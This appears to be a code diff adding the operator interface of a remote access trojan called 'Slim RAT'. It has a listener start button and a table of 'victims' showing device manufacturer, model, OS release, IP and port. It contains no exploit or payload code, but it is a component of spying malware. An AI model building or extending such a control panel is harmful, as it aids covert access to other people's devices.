@@ -10,13 +10,52 @@
   <script src="../node_modules/angular-route/angular-route.js"></script>
   <script src="../node_modules/ng-infinite-scroll/build/ng-infinite-scroll.js"></script>
   <script src="assets/javascripts/vendors/jquery.js"></script>
+  <script src="assets/javascripts/vendors/materialize.js"></script>
   <script src="assets/javascripts/vendors/leaflet.js"></script>
   <script src="assets/javascripts/controllers/main.js"></script>
   <script>if (window.module) module = window.module;</script>
+  <link rel="stylesheet" href="assets/stylesheets/vendors/materialize.css">
   <link rel="stylesheet" href="assets/stylesheets/vendors/leaflet.css">
   <link rel="stylesheet" href="assets/stylesheets/application.css">
 </head>
 <body ng-controller="MainCtrl">
-  <h2>MainCtrl</h2>
+  <nav class="indigo darken-4">
+    <div class="nav-wrapper container">
+      <div class="left">
+        <img class="logo" src="assets/images/logo.png" alt="Slim RAT">
+      </div>
+      <div class="right">
+        <button ng-disabled="isListen" ng-click="isListen=true;Listen(port);" class="btn-floating btn-large halfway-fab waves-effect waves-light indigo"><i class="material-icons">play_arrow</i></button>
+      </div>
+    </div>
+  </nav>
+  <main class="main">
+    <div class="container">
+      <h3 class="title indigo-text"><i class="material-icons">group</i> Users</h3>
+      <table class="table bordered striped">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Manufacture</th>
+            <th>Model</th>
+            <th>Release</th>
+            <th>IP</th>
+            <th>Port</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr ng-repeat="(key, victim) in victims" ng-click="openLab(key)">
+            <td class="id" ng-bind="key"></td>
+            <td class="manf" ng-bind="victim.manf"></td>
+            <td class="model" ng-bind="victim.model"></td>
+            <td class="release" ng-bind="victim.release"></td>
+            <td class="ip" ng-bind="victim.ip"></td>
+            <td class="port" ng-bind="victim.port"></td>
+          </tr>
+        </tbody>
+      </table>
+      <div id="log"></div>
+    </div>
+  </main>
 </body>
 </html>
